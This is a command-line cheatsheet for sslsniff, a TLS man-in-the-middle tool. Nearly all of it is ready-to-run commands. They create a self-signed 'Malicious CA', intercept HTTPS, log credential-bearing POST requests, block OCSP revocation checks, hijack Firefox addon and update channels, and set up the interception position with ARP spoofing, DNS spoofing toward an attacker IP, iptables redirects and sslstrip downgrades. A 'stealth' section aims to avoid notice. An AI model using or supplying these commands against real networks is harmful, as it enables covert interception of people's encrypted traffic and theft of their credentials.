# sslsniff Cheatsheet

## Quick Start

```bash
# Generate CA
openssl genrsa -out ca.key 2048
openssl req -new -x509 -key ca.key -out ca.crt -days 365 -subj "/CN=Fake CA"

# Basic attack
sslsniff -a -c ca.crt -s 443 -w output.log
```

## Essential Commands

```bash
# Authority mode
sslsniff -a -c ca.crt -s 443 -w output.log

# With certificate chain
sslsniff -a -c ca.crt -m intermediate.crt -s 443 -w output.log

# Targeted mode
sslsniff -t /path/to/certs/ -s 443 -w output.log

# HTTP interception
sslsniff -a -c ca.crt -s 443 -h 8080 -w output.log
```

## Browser Targeting

```bash
# Firefox only
sslsniff -a -c ca.crt -s 443 -f ff -w output.log

# Multiple browsers
sslsniff -a -c ca.crt -s 443 -f ff,ie,safari -w output.log

# All browsers
sslsniff -a -c ca.crt -s 443 -f ff,ie,safari,opera -w output.log

# iOS
sslsniff -a -c ca.crt -s 443 -f ios -w output.log
```

## Attack Options

```bash
# Deny OCSP requests
sslsniff -a -c ca.crt -s 443 -d -w output.log

# Log POST requests only
sslsniff -a -c ca.crt -s 443 -p -w output.log

# Mozilla addon interception
sslsniff -a -c ca.crt -s 443 -e https://addons.mozilla.org -j sha256_hash -w output.log

# Firefox update location
sslsniff -a -c ca.crt -s 443 -u /path/to/update.xml -w output.log
```

## Attack Scenarios

### Credential Harvesting

```bash
# Generate CA
openssl genrsa -out ca.key 2048
openssl req -new -x509 -key ca.key -out ca.crt -days 365 -subj "/CN=Malicious CA"

# Start sslsniff
sslsniff -a -c ca.crt -s 443 -p -w credentials.log

# Requires network positioning (ARP spoof, DNS spoof, etc.)
```

### OCSP Attack

```bash
# Deny OCSP to prevent revocation checking
sslsniff -a -c ca.crt -s 443 -d -w ocsp_attack.log
```

### Null-Prefix Attack

```bash
# Requires specialized CA with null-prefix support
sslsniff -a -c null_prefix_ca.crt -s 443 -w null_prefix.log
```

### Targeted Domain Attack

```bash
# Prepare certificate directory
mkdir certs/
cp target.com.crt certs/
cp target.com.key certs/

# Start targeted mode
sslsniff -t certs/ -s 443 -w targeted.log
```

## Stealth Configuration

```bash
# Deny OCSP and target specific browser
sslsniff -a -c ca.crt -s 443 -d -f ff -w stealth.log

# Minimal logging (POST only)
sslsniff -a -c ca.crt -s 443 -p -w minimal.log
```

## Network Positioning

```bash
# ARP spoofing
arpspoof -i eth0 -t target.local gateway_ip

# DNS spoofing
dnschef --fakeip attacker_ip --fake domains=target.com

# iptables redirect
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 443
```

## Certificate Management

```bash
# Generate CA
openssl genrsa -out ca.key 2048
openssl req -new -x509 -key ca.key -out ca.crt -days 365

# Verify CA
openssl x509 -in ca.crt -text -noout

# Check certificate chain
openssl verify -CAfile ca.crt generated.crt

# Install CA in trust store
# Linux
sudo cp ca.crt /usr/local/share/ca-certificates/malicious.crt
sudo update-ca-certificates

# Firefox
# Settings > Privacy & Security > Certificates > View Certificates > Import
```

## Integration

### With sslstrip

```bash
# HTTP downgrade attack
sslstrip -l 10000 &
sslsniff -a -c ca.crt -s 443 -w combined.log
```

### With Wireshark

```bash
# Capture traffic
tcpdump -i eth0 -w sslsniff_traffic.pcap port 443

# Analyze in Wireshark
wireshark sslsniff_traffic.pcap
```

### With Metasploit

```bash
# Use sslsniff during exploitation
# Requires network positioning via Metasploit
```

## Debugging

```bash
# Full debug output
sslsniff -a -c ca.crt -s 443 -w debug.log 2>&1 | tee full_debug.log

# Check certificate generation
openssl x509 -in generated.crt -text -noout

# Verify CA trust
openssl verify -CAfile ca.crt generated.crt
```

## Common Patterns

```bash
# Capture all HTTPS
sslsniff -a -c ca.crt -s 443 -w all.log

# Capture specific domain
sslsniff -t certs/ -s 443 -w specific.log

# Capture with HTTP fingerprinting
sslsniff -a -c ca.crt -s 443 -h 8080 -w fingerprint.log
```

## Cleanup

```bash
# No persistent changes to system
# sslsniff is stateless

# Check captured logs
ls -la *.log
cat output.log | head -50
```
